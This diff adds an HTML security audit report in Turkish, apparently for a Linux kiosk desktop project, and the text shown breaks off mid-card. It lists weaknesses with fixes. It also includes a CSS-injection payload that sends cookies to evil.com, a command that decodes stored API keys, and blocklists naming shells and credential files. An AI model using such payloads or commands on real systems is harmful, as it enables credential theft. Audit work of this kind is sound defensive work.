@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ankora Linux Ayaz DE — Güvenlik Denetim Raporu v2.0.0</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap');
+
+  :root {
+    --bg-deep: #0a0c10;
+    --bg-card: #12151c;
+    --bg-card-hover: #1a1e28;
+    --border: #1e2330;
+    --text-primary: #e8ecf4;
+    --text-secondary: #8892a8;
+    --text-muted: #5c6478;
+    --accent: #3b82f6;
+    --accent-glow: rgba(59, 130, 246, 0.15);
+    --green: #10b981;
+    --green-bg: rgba(16, 185, 129, 0.08);
+    --yellow: #f59e0b;
+    --yellow-bg: rgba(245, 158, 11, 0.08);
+    --red: #ef4444;
+    --red-bg: rgba(239, 68, 68, 0.08);
+    --orange: #f97316;
+    --orange-bg: rgba(249, 115, 22, 0.08);
+    --blue-bg: rgba(59, 130, 246, 0.06);
+    --radius: 10px;
+    --font: 'Inter', -apple-system, sans-serif;
+    --mono: 'JetBrains Mono', monospace;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: var(--font);
+    background: var(--bg-deep);
+    color: var(--text-primary);
+    line-height: 1.7;
+    min-height: 100vh;
+    -webkit-print-color-adjust: exact;
+    print-color-adjust: exact;
+  }
+
+  @media print {
+    body { background: #fff; color: #111; }
+    .page-break { page-break-before: always; }
+    .no-print { display: none !important; }
+    .card { border: 1px solid #ddd !important; background: #fafafa !important; }
+    .severity-badge { border: 1px solid currentColor; }
+    .header-hero { background: #111 !important; }
+  }
+
+  .container {
+    max-width: 960px;
+    margin: 0 auto;
+    padding: 24px 32px;
+  }
+
+  /* HERO HEADER */
+  .header-hero {
+    background: linear-gradient(145deg, #0d1117 0%, #161b22 50%, #0d1117 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 56px 0 48px;
+    position: relative;
+    overflow: hidden;
+  }
+  .header-hero::before {
+    content: '';
+    position: absolute;
+    top: -120px; right: -120px;
+    width: 380px; height: 380px;
+    border-radius: 50%;
+    background: radial-gradient(circle, rgba(59,130,246,0.06) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .header-hero .container { position: relative; z-index: 1; }
+
+  .header-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 4px 12px;
+    border-radius: 100px;
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    margin-bottom: 16px;
+  }
+  .badge-classified {
+    background: rgba(239,68,68,0.12);
+    color: var(--red);
+    border: 1px solid rgba(239,68,68,0.2);
+  }
+
+  .header-hero h1 {
+    font-size: 32px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+    margin-bottom: 6px;
+    background: linear-gradient(135deg, #e8ecf4 0%, #8892a8 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .header-hero .subtitle {
+    font-size: 15px;
+    color: var(--text-secondary);
+    font-weight: 400;
+  }
+  .header-meta-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 24px;
+    margin-top: 24px;
+    font-size: 12px;
+    color: var(--text-muted);
+  }
+  .header-meta-row span {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+  }
+  .header-meta-row strong { color: var(--text-secondary); font-weight: 600; }
+
+  /* SCORECARD */
+  .scorecard-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 14px;
+    margin: 32px 0;
+  }
+  .score-item {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 20px 18px;
+    text-align: center;
+  }
+  .score-item .number {
+    font-size: 36px;
+    font-weight: 800;
+    letter-spacing: -1px;
+    line-height: 1;
+    margin-bottom: 6px;
+  }
+  .score-item .label {
+    font-size: 11px;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.7px;
+    font-weight: 600;
+  }
+  .score-item.critical .number { color: var(--red); }
+  .score-item.high .number { color: var(--orange); }
+  .score-item.medium .number { color: var(--yellow); }
+  .score-item.info .number { color: var(--green); }
+
+  /* OVERALL SCORE */
+  .overall-score {
+    display: flex;
+    align-items: center;
+    gap: 24px;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 28px 32px;
+    margin-bottom: 32px;
+  }
+  .score-ring {
+    width: 100px; height: 100px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 36px;
+    font-weight: 800;
+    flex-shrink: 0;
+    position: relative;
+  }
+  .score-ring.good {
+    background: conic-gradient(var(--green) 0deg, var(--green) 280deg, rgba(255,255,255,0.05) 280deg);
+    color: var(--green);
+  }
+  .score-ring::after {
+    content: '';
+    position: absolute;
+    width: 74px; height: 74px;
+    border-radius: 50%;
+    background: var(--bg-card);
+  }
+  .score-ring span { position: relative; z-index: 1; font-size: 32px; }
+  .score-detail h2 { font-size: 20px; font-weight: 700; margin-bottom: 4px; }
+  .score-detail p { font-size: 13px; color: var(--text-secondary); line-height: 1.6; }
+
+  /* SECTION */
+  .section { margin: 40px 0; }
+  .section-heading {
+    font-size: 18px;
+    font-weight: 700;
+    margin-bottom: 4px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .section-heading .icon {
+    width: 20px; height: 20px;
+    border-radius: 5px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+  }
+  .section-desc { font-size: 13px; color: var(--text-muted); margin-bottom: 16px; }
+
+  /* CARDS (FINDINGS) */
+  .card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 22px 24px;
+    margin-bottom: 14px;
+    transition: border-color 0.2s;
+  }
+  .card:hover { border-color: rgba(255,255,255,0.08); }
+
+  .card-header {
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    gap: 12px;
+    margin-bottom: 10px;
+  }
+  .card-header h3 {
+    font-size: 14px;
+    font-weight: 700;
+    line-height: 1.4;
+  }
+  .severity-badge {
+    padding: 3px 10px;
+    border-radius: 100px;
+    font-size: 10px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.6px;
+    white-space: nowrap;
+    flex-shrink: 0;
+  }
+  .sev-critical { background: var(--red-bg); color: var(--red); }
+  .sev-high { background: var(--orange-bg); color: var(--orange); }
+  .sev-medium { background: var(--yellow-bg); color: var(--yellow); }
+  .sev-low { background: var(--blue-bg); color: var(--accent); }
+  .sev-info { background: var(--green-bg); color: var(--green); }
+  .sev-positive { background: var(--green-bg); color: var(--green); }
+
+  .card p, .card li {
+    font-size: 13px;
+    color: var(--text-secondary);
+    line-height: 1.65;
+  }
+  .card ul { padding-left: 18px; margin-top: 6px; }
+  .card li { margin-bottom: 3px; }
+
+  .card-location {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 11px;
+    color: var(--text-muted);
+    font-family: var(--mono);
+    margin-top: 10px;
+    padding-top: 10px;
+    border-top: 1px solid rgba(255,255,255,0.04);
+  }
+
+  code {
+    font-family: var(--mono);
+    font-size: 12px;
+    background: rgba(255,255,255,0.05);
+    padding: 2px 6px;
+    border-radius: 4px;
+    color: var(--accent);
+  }
+
+  /* TABLE */
+  .matrix-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12.5px;
+    margin-top: 12px;
+  }
+  .matrix-table th {
+    text-align: left;
+    padding: 10px 14px;
+    font-weight: 700;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    color: var(--text-muted);
+    border-bottom: 1px solid var(--border);
+    background: rgba(255,255,255,0.02);
+  }
+  .matrix-table td {
+    padding: 10px 14px;
+    border-bottom: 1px solid rgba(255,255,255,0.03);
+    color: var(--text-secondary);
+    vertical-align: top;
+  }
+  .matrix-table tr:hover td { background: rgba(255,255,255,0.015); }
+
+  /* FOOTER */
+  .report-footer {
+    text-align: center;
+    padding: 40px 0 24px;
+    font-size: 11px;
+    color: var(--text-muted);
+    border-top: 1px solid var(--border);
+    margin-top: 48px;
+  }
+
+  .green { color: var(--green); }
+  .yellow { color: var(--yellow); }
+  .red { color: var(--red); }
+  .orange { color: var(--orange); }
+
+  .checklist-item {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    padding: 8px 0;
+    font-size: 13px;
+    color: var(--text-secondary);
+  }
+  .check-icon {
+    width: 18px; height: 18px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 11px;
+    font-weight: 700;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+  .check-pass { background: var(--green-bg); color: var(--green); }
+  .check-warn { background: var(--yellow-bg); color: var(--yellow); }
+  .check-fail { background: var(--red-bg); color: var(--red); }
+
+  .recommendation-box {
+    background: rgba(59,130,246,0.04);
+    border: 1px solid rgba(59,130,246,0.12);
+    border-radius: var(--radius);
+    padding: 16px 20px;
+    margin-top: 12px;
+  }
+  .recommendation-box strong {
+    display: block;
+    font-size: 12px;
+    color: var(--accent);
+    margin-bottom: 4px;
+    text-transform: uppercase;
+    letter-spacing: 0.4px;
+  }
+  .recommendation-box p { font-size: 12.5px; color: var(--text-secondary); }
+</style>
+</head>
+<body>
+
+<!-- ============================= HERO HEADER ============================= -->
+<header class="header-hero">
+  <div class="container">
+    <div class="header-badge badge-classified">🔒 GİZLİ — DAHİLİ GÜVENLİK DENETİMİ</div>
+    <h1>Ankora Linux — Ayaz DE v2.0.0</h1>
+    <p class="subtitle">Kapsamlı Güvenlik Denetim Raporu (Kod Tabanı Tam İncelemesi)</p>
+    <div class="header-meta-row">
+      <span><strong>Tarih:</strong> 24 Eylül 2026</span>
+      <span><strong>Denetçi:</strong> Antigravity Security Audit Engine</span>
+      <span><strong>Kapsam:</strong> Tam Kaynak Kod (Rust + JavaScript + HTML + Config + Scripts)</span>
+      <span><strong>Proje:</strong> github.com/Ankora-Linux/Ayaz</span>
+    </div>
+  </div>
+</header>
+
+<!-- ============================= ÖZET PUANLAMA ============================= -->
+<div class="container">
+
+  <div class="overall-score">
+    <div class="score-ring good"><span>78</span></div>
+    <div class="score-detail">
+      <h2>Genel Güvenlik Puanı: 78 / 100 — <span class="green">İyi Seviye</span></h2>
+      <p>Ankora Linux Ayaz DE, bir kiosk masaüstü ortamı için endüstri ortalamasının üzerinde güvenlik önlemleri barındırıyor. Komut yürütme, dosya erişimi ve AI entegrasyonu gibi hassas alanlarda katmanlı koruma mevcut. Aşağıda detaylandırılan orta ve düşük ciddiyet seviyesindeki bulgular kapatıldığında bu puan 90+ seviyesine çıkabilir.</p>
+    </div>
+  </div>
+
+  <div class="scorecard-grid">
+    <div class="score-item critical">
+      <div class="number">0</div>
+      <div class="label">Kritik</div>
+    </div>
+    <div class="score-item high">
+      <div class="number">2</div>
+      <div class="label">Yüksek</div>
+    </div>
+    <div class="score-item medium">
+      <div class="number">5</div>
+      <div class="label">Orta</div>
+    </div>
+    <div class="score-item info">
+      <div class="number">7</div>
+      <div class="label">Düşük / Bilgi</div>
+    </div>
+  </div>
+
+  <!-- ============================= BÖLÜM 1: YÜKSEK BULGULAR ============================= -->
+  <div class="section">
+    <h2 class="section-heading"><span class="icon" style="background:var(--orange-bg);color:var(--orange);">!</span> Yüksek Ciddiyet Bulguları</h2>
+    <p class="section-desc">Aktif saldırı vektörü oluşturabilecek ve öncelikli müdahale gerektiren bulgular</p>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>SEC-HIGH-01: Kimlik Bilgisi Depolama — Base64 Encoding Tek Katman</h3>
+        <span class="severity-badge sev-high">Yüksek</span>
+      </div>
+      <p>API anahtarları (OpenAI, Gemini, Groq) <code>credentials.dat</code> dosyasında Base64 ile encode edilerek saklanıyor. Base64 bir şifreleme algoritması değil, encoding standardıdır ve kolayca decode edilebilir. Dosya izinleri 0600 olarak ayarlanmış (yalnızca Unix), ancak disk erişimi olan bir saldırgan tüm API anahtarlarını düz metin olarak okuyabilir.</p>
+      <ul>
+        <li><code>load_credentials()</code> → Base64 decode → JSON parse → ham API anahtarları</li>
+        <li>Saldırı Senaryosu: <code>cat ~/.config/ankora/credentials.dat | base64 -d</code> → tüm anahtarlar ifşa</li>
+        <li>Windows ortamında dosya izin koruması (0600) uygulanamıyor</li>
+      </ul>
+      <div class="recommendation-box">
+        <strong>Öneri</strong>
+        <p>OS-native keychain/keyring entegrasyonu kullanılmalı (Linux: libsecret/GNOME Keyring, macOS: Keychain, Windows: DPAPI). Alternatif olarak AES-256-GCM veya ChaCha20-Poly1305 ile şifreleme uygulanabilir. En azından bir master anahtar türetimi (PBKDF2 veya Argon2) ile korunmalı.</p>
+      </div>
+      <div class="card-location">📍 src-tauri/src/main.rs · Satır 271–296 · <code>load_credentials() / save_credentials()</code></div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>SEC-HIGH-02: Kurulumda Varsayılan Parola Hardcode</h3>
+        <span class="severity-badge sev-high">Yüksek</span>
+      </div>
+      <p>Kurulum sihirbazının frontend tarafında, kullanıcı parola girmezse varsayılan olarak <code>"ankora"</code> değeri gönderiliyor. Bu, kurulum sırasında kullanıcının dikkat etmemesi halinde son derece zayıf, tahmin edilebilir bir parola ile sistem kurulmasına yol açar.</p>
+      <ul>
+        <li><code>password: document.getElementById('inst-password')?.value || 'ankora'</code></li>
+        <li>Bu tür bir fallback değeri brute-force veya wordlist saldırıları için ilk hedef olur</li>
+        <li>Rust backend tarafında parola karmaşıklık doğrulaması bulunmuyor</li>
+      </ul>
+      <div class="recommendation-box">
+        <strong>Öneri</strong>
+        <p>Varsayılan parola fallback'i kaldırılmalı. Kullanıcı boş parola ile kurulum başlatmaya çalışırsa frontend ve backend tarafında hata gösterilmeli. En az 8 karakter, karışık karakter kümesi (harf+rakam+özel) zorunluluğu getirilmeli.</p>
+      </div>
+      <div class="card-location">📍 src/app.js · Satır 1356 · <code>InstallerWizard.runInstall()</code></div>
+    </div>
+  </div>
+
+  <!-- ============================= BÖLÜM 2: ORTA BULGULAR ============================= -->
+  <div class="section page-break">
+    <h2 class="section-heading"><span class="icon" style="background:var(--yellow-bg);color:var(--yellow);">⚡</span> Orta Ciddiyet Bulguları</h2>
+    <p class="section-desc">Belirli koşullarda risk oluşturabilecek, planlı düzeltme gerektiren bulgular</p>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>SEC-MED-01: Gemini API Anahtarı URL Parametresinde Açık İletim</h3>
+        <span class="severity-badge sev-medium">Orta</span>
+      </div>
+      <p>Google Gemini API çağrılarında API anahtarı <code>?key=...</code> şeklinde URL query parametresine ekleniyor. Bu, anahtarın HTTP sunucu loglarına, proxy loglarına, tarayıcı geçmişine ve ağ izleme araçlarına sızma riskini artırır.</p>
+      <ul>
+        <li><code>format!("...?key={}", resolved_key)</code> → anahtarın URL'de düz metin olarak görünmesi</li>
+        <li>OpenAI ve Groq için <code>Authorization: Bearer</code> header'ı doğru şekilde kullanılmış</li>
+      </ul>
+      <div class="recommendation-box">
+        <strong>Öneri</strong>
+        <p>Google'ın yeni Gemini API v1 formatı HTTP header tabanlı kimlik doğrulama da destekler. <code>x-goog-api-key</code> header'ı kullanılması tercih edilmeli. Bu, Google'ın kendi önerisidir.</p>
+      </div>
+      <div class="card-location">📍 src-tauri/src/main.rs · Satır 864–866 · <code>query_local_ai() → Gemini bloğu</code></div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>SEC-MED-02: UpdaterManager.formatMarkdown() — Kısıtlı XSS Riski</h3>
+        <span class="severity-badge sev-medium">Orta</span>
+      </div>
+      <p>Güncelleme notları (<code>release_notes</code>) GitHub API'den alınıp <code>formatMarkdown()</code> fonksiyonuyla HTML'e dönüştürülüyor. Fonksiyon önce <code>escapeHtml()</code> ile temizleme yapıyor, ardından regex ile <code>&lt;h2&gt;</code>, <code>&lt;strong&gt;</code>, <code>&lt;li&gt;</code> etiketleri oluşturuyor. GitHub API yanıtı değiştirilirse (MITM veya repo devralma) sınırlı HTML enjeksiyonu yapılabilir.</p>
+      <ul>
+        <li><code>escapeHtml()</code> uygulandığı için doğrudan <code>&lt;script&gt;</code> enjeksiyonu engelleniyor</li>
+        <li>Ancak bold/heading regex dönüşümleri CSS-based saldırı vektörü açabilir</li>
+        <li>CSP <code>script-src 'self'</code> sayesinde script yürütülmesi engelleniyor — risk sınırlı</li>
+      </ul>
+      <div class="recommendation-box">
+        <strong>Öneri</strong>
+        <p>Güncelleme notlarını sadece <code>textContent</code> ile render edin veya DOMPurify benzeri bir sanitizer kütüphanesi kullanın. Markdown ayrıştırma regex yerine kontrollü bir parser ile yapılmalı.</p>
+      </div>
+      <div class="card-location">📍 src/app.js · Satır 2215–2224 · <code>UpdaterManager.formatMarkdown()</code></div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>SEC-MED-03: Güncelleme İndirme — HTTPS Redirect Takibi Kapalı Ama TLS Doğrulaması Eksik</h3>
+        <span class="severity-badge sev-medium">Orta</span>
+      </div>
+      <p>Güncelleme indirme istemcisi (<code>download_and_apply_de_update</code>) redirect takibini kapatmış, ancak indirilen <code>.deb</code> paketinin bütünlük doğrulaması (checksum/GPG signature) yapılmıyor. Paket doğrudan <code>dpkg -i</code> ile sisteme kurulabiliyor.</p>
+      <ul>
+        <li>Sadece URL prefix kontrolü mevcut (<code>https://github.com/</code> veya <code>https://objects.githubusercontent.com/</code>)</li>
+        <li>SHA256 checksum doğrulaması yok</li>
+        <li>GPG imza doğrulaması yok</li>
+        <li>İndirilen dosyanın gerçekten valid bir .deb olup olmadığı kontrol edilmiyor</li>
+      </ul>
+      <div class="recommendation-box">
+        <strong>Öneri</strong>
+        <p>GitHub Release'e SHA256 checksum dosyası ekleyin. İndirme sonrası <code>sha256sum</code> veya Rust'ta <code>sha2</code> crate ile hash doğrulaması yapın. İdeal olarak GPG ile imzalı paketler kullanın.</p>
+      </div>
+      <div class="card-location">📍 src-tauri/src/main.rs · Satır 1596–1701 · <code>download_and_apply_de_update()</code></div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>SEC-MED-04: CSP Politikasında <code>unsafe-inline</code> Style Directive</h3>
+        <span class="severity-badge sev-medium">Orta</span>
+      </div>
+      <p>Tauri güvenlik yapılandırmasındaki CSP (Content Security Policy) kuralında <code>style-src 'self' 'unsafe-inline'</code> directifi mevcut. Bu, CSS enjeksiyonu saldırılarına (data exfiltration via CSS) kapı aralıyor.</p>
+      <ul>
+        <li><code>script-src 'self'</code> doğru şekilde kısıtlanmış — XSS korunması sağlam</li>
+        <li><code>object-src 'self' data:</code> → data URI ile obje yükleme potansiyel vektör</li>
+        <li><code>frame-src 'self' data: blob:</code> → PDF görüntüleme için gerekli, ancak geniş</li>
+        <li><code>connect-src</code> sadece localhost'a izin veriyor — SSRF önlemi var</li>
+      </ul>
+      <div class="recommendation-box">
+        <strong>Öneri</strong>
+        <p>Tüm inline style'ları CSS dosyasına taşıyıp <code>'unsafe-inline'</code> kaldırılmalı. <code>object-src</code> daha da kısıtlanabilir. <code>frame-src</code> yalnızca <code>'self' blob:</code> olabilir (data: kaldırılarak).</p>
+      </div>
+      <div class="card-location">📍 src-tauri/tauri.conf.json · Satır 49 · <code>security.csp</code></div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>SEC-MED-05: <code>rm -rf /tmp/*</code> Whitelist İçinde ve Doğrudan Yürütülebilir</h3>
+        <span class="severity-badge sev-medium">Orta</span>
+      </div>
+      <p><code>EXACT_ALLOWED_COMMANDS</code> ve <code>ALLOWED_AGENT_ACTIONS</code> listelerinde <code>rm -rf /tmp/*</code> komutu bulunuyor. Bu, AI ajanı veya terminal üzerinden kullanıcının /tmp dizinini tamamen silmesine olanak tanıyor. Çalışan uygulamaların geçici dosyaları dahil olmak üzere tüm /tmp içeriği silinebilir.</p>
+      <ul>
+        <li>Çalışmakta olan uygulamaların soket ve temp dosyalarını bozabilir</li>
+        <li><code>echo 3 > /proc/sys/vm/drop_caches</code> de listede — sistemin performansını anlık olarak düşürebilir</li>
+        <li>AI ajanı kullanıcı onayı ile bu komutu tetikleyebilir</li>
+      </ul>
+      <div class="recommendation-box">
+        <strong>Öneri</strong>
+        <p><code>/tmp</code> temizliği için daha güvenli bir yaklaşım benimsenebilir: sadece 24 saatten eski dosyaları temizleyen <code>find /tmp -mtime +1 -delete</code> komutu veya <code>tmpwatch</code> aracı tercih edilmeli.</p>
+      </div>
+      <div class="card-location">📍 src-tauri/src/main.rs · Satır 40, 69 · <code>EXACT_ALLOWED_COMMANDS / ALLOWED_AGENT_ACTIONS</code></div>
+    </div>
+  </div>
+
+  <!-- ============================= BÖLÜM 3: DÜŞÜK / BİLGİ BULGULARI ============================= -->
+  <div class="section page-break">
+    <h2 class="section-heading"><span class="icon" style="background:var(--blue-bg);color:var(--accent);">ℹ</span> Düşük Ciddiyet / Bilgilendirme Bulguları</h2>
+    <p class="section-desc">Doğrudan saldırı vektörü oluşturmayan, ancak güvenlik hijyenini iyileştirmek için ele alınması önerilen bulgular</p>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>SEC-LOW-01: Duvar Kağıdı Ayarında CSS Injection Potansiyeli</h3>
+        <span class="severity-badge sev-low">Düşük</span>
+      </div>
+      <p><code>ThemeManager.setWallpaper()</code> fonksiyonunda wallpaper dosya adı doğrudan <code>url('...')</code> CSS property'sine yazılıyor. Saldırgan localStorage'ı manipüle edebilirse CSS enjeksiyonu yapabilir.</p>
+      <ul>
+        <li><code>elWp.style.backgroundImage = `url('${wpFile}')`</code> — sanitizasyon yok</li>
+        <li>Saldırı vektörü: <code>'); background:url(https://evil.com/track?cookie='+document.cookie+'</code></li>
+        <li>localStorage yerel olduğundan riskin gerçekleşme olasılığı düşük</li>
+      </ul>
+      <div class="card-location">📍 src/app.js · Satır 1498–1499 · <code>ThemeManager.setWallpaper()</code></div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>SEC-LOW-02: repo_override Parametresi İle Keyfi GitHub Reposu Sorgulanabilir</h3>
+        <span class="severity-badge sev-low">Düşük</span>
+      </div>
+      <p><code>check_de_update()</code> fonksiyonu <code>repo_override</code> parametresi kabul ediyor. Frontend bu parametreyi kullanmıyor, ancak IPC üzerinden doğrudan çağrılırsa herhangi bir GitHub reposu sorgulanabilir. Bilgi ifşası riski minimal.</p>
+      <div class="card-location">📍 src-tauri/src/main.rs · Satır 1529–1531 · <code>check_de_update()</code></div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>SEC-LOW-03: Terminal Komut Geçmişi localStorage'da Düz Metin</h3>
+        <span class="severity-badge sev-low">Düşük</span>
+      </div>
+      <p>Terminal komut geçmişi <code>ankora_term_history</code> anahtarı ile localStorage'da saklanıyor. Hassas veriler (dosya yolları, kullanıcı adları) yanlışlıkla terminal geçmişine kaydedilebilir.</p>
+      <div class="card-location">📍 src/app.js · Satır 574–629 · <code>Terminal.saveHistory()</code></div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>SEC-LOW-04: <code>cat</code> Komutu ALLOWED_UTILITIES Listesinde Yok Ama EXACT_ALLOWED İçinde Mevcut</h3>
+        <span class="severity-badge sev-low">Düşük</span>
+      </div>
+      <p><code>run_terminal_command()</code> içindeki dinamik yol, <code>cat</code> aracını <code>ALLOWED_UTILITIES</code> listesinde aramak için bir kontrol bloğu içeriyor (satır 593-597), ancak <code>cat</code> bu listede yer almıyor. Bu, kodun ölü dal (dead code) içerdiğini ve bakım karmaşası yaratabileceğini gösteriyor.</p>
+      <div class="card-location">📍 src-tauri/src/main.rs · Satır 51–54, 593–597 · <code>ALLOWED_UTILITIES + cat bloğu</code></div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>SEC-LOW-05: Sudoers Kuralı Tek Kullanıcıya Sabitlenmiş</h3>
+        <span class="severity-badge sev-low">Düşük</span>
+      </div>
+      <p>Sudoers dosyası <code>ankora</code> kullanıcısına sabitlenmiş. Farklı kullanıcı adıyla kurulum yapılırsa güncelleme mekanizması çalışmaz. Kurulum sonrası kullanıcı adına göre dinamik sudoers üretilmeli.</p>
+      <div class="card-location">📍 scripts/ankora-updater-sudoers · Satır 4</div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>SEC-LOW-06: Tokio "full" Feature Flag — Gereksiz Yüzey Alanı</h3>
+        <span class="severity-badge sev-low">Düşük</span>
+      </div>
+      <p><code>Cargo.toml</code>'da Tokio <code>features = ["full"]</code> ile dahil edilmiş. Bu, kullanılmayan modülleri (net, signal, fs vb.) de derliyor ve saldırı yüzey alanını artırıyor. Sadece gereken feature'lar seçilmeli (<code>rt, macros</code>).</p>
+      <div class="card-location">📍 src-tauri/Cargo.toml · Satır 15</div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>SEC-LOW-07: update-helper.sh'de DEBIAN_FRONTEND ve Sessiz Kurulum</h3>
+        <span class="severity-badge sev-low">Düşük</span>
+      </div>
+      <p>Güncelleme yardımcısı scripti başarısız <code>dpkg -i</code> durumunda <code>apt-get install -f -y -qq</code> çalıştırıyor. Bu, beklenmedik bağımlılıkların kullanıcı müdahalesi olmadan kurulmasına neden olabilir.</p>
+      <div class="card-location">📍 scripts/ayaz-update-helper.sh · Satır 27–30</div>
+    </div>
+  </div>
+
+  <!-- ============================= BÖLÜM 4: POZİTİF BULGULAR ============================= -->
+  <div class="section page-break">
+    <h2 class="section-heading"><span class="icon" style="background:var(--green-bg);color:var(--green);">✓</span> Güçlü Yönler — Pozitif Güvenlik Bulguları</h2>
+    <p class="section-desc">Projede doğru uygulanmış, endüstri standartlarına uygun güvenlik mekanizmaları</p>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>Katmanlı Komut Yürütme Güvenliği (Whitelist + Kara Liste + Metakarakter Filtresi)</h3>
+        <span class="severity-badge sev-positive">Güçlü</span>
+      </div>
+      <p>Terminal motoru üçlü koruma katmanı uyguluyor:</p>
+      <ul>
+        <li><strong>Kesin Whitelist:</strong> <code>EXACT_ALLOWED_COMMANDS</code> — sadece tanımlı komutlar yürütülebilir</li>
+        <li><strong>Kara Liste:</strong> <code>FORBIDDEN_LAUNCH_BINARIES</code> — <code>sudo</code>, <code>bash</code>, <code>dd</code>, <code>passwd</code> gibi tehlikeli araçlar kesinlikle engelli</li>
+        <li><strong>Metakarakter Filtresi:</strong> <code>; & | \` $ > < ( )</code> karakterleri engelleniyor</li>
+        <li><strong>Dizin Geçişi Koruması:</strong> <code>..</code> içeren argümanlar reddediliyor</li>
+        <li><strong>Hassas Dosya Kalıpları:</strong> <code>/etc/shadow</code>, SSH anahtarları vb. mutlak engel</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>Dosya Okuma Güvenliği — 7 Katmanlı Koruma</h3>
+        <span class="severity-badge sev-positive">Güçlü</span>
+      </div>
+      <p><code>read_document_file()</code> fonksiyonu yedi ayrı güvenlik kontrolü uyguluyor:</p>
+      <ul>
+        <li>Dizin geçişi (<code>..</code>) engeli</li>
+        <li>İzin verilen dosya uzantısı kontrolü (yalnızca pdf, md, txt, conf, log, json, yaml vb.)</li>
+        <li>Kanonik yol çözümleme (<code>canonicalize</code> → symlink bypass önleme)</li>
+        <li>Hassas dosya kalıp eşleşmesi (kanonik yol üzerinde)</li>
+        <li>İzin verilen dizin sınırları (Documents, Downloads, home)</li>
+        <li>Hard-link istismarı tespiti (<code>nlink > 1</code> reddi)</li>
+        <li>50 MB dosya boyutu sınırı</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>Güvenli Uygulama Başlatma — Symlink Bypass Koruması</h3>
+        <span class="severity-badge sev-positive">Güçlü</span>
+      </div>
+      <p><code>launch_application()</code> fonksiyonu kanonik yol kontrolü yaparak sembolik linklerin kara listeyi atlatmasını önlüyor. Yalnızca <code>/usr/bin/</code>, <code>/bin/</code>, <code>/usr/local/bin/</code>, <code>/usr/games/</code> ve <code>/opt/</code> altındaki programlar çalıştırılabiliyor.</p>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>AI Ajan Güvenliği — Onay Zinciri ve Eylem Kısıtlama</h3>
+        <span class="severity-badge sev-positive">Güçlü</span>
+      </div>
+      <ul>
+        <li>AI'ın yürütebileceği komutlar <code>ALLOWED_AGENT_ACTIONS</code> ile kısıtlı (8 komut)</li>
+        <li>Her AI eylemi kullanıcı onayı gerektiriyor (Confirm Modal)</li>
+        <li>Ollama uç noktası yalnızca <code>127.0.0.1</code> / <code>localhost</code> ile kısıtlı</li>
+        <li>SSRF koruması: <code>169.254.169.254</code> (bulut metadata) ve <code>metadata.google.internal</code> engelli</li>
+        <li>Custom endpoint'ler HTTPS veya localhost olmak zorunda</li>
+        <li>HTTP redirect takibi kapatılmış (<code>Policy::none()</code>) — redirect-based SSRF engelli</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>XSS Koruması — escapeHtml() Tutarlı Kullanımı</h3>
+        <span class="severity-badge sev-positive">Güçlü</span>
+      </div>
+      <p>Frontend tarafında tüm kullanıcı verisi (paket adları, dosya adları, disk bilgileri) <code>escapeHtml()</code> fonksiyonu ile HTML-encode edilerek DOM'a yazılıyor. <code>&amp;, &lt;, &gt;, ", '</code> karakterleri kaçırılıyor. AI yanıtları <code>textContent</code> ile render ediliyor, <code>innerHTML</code> kullanılmıyor.</p>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
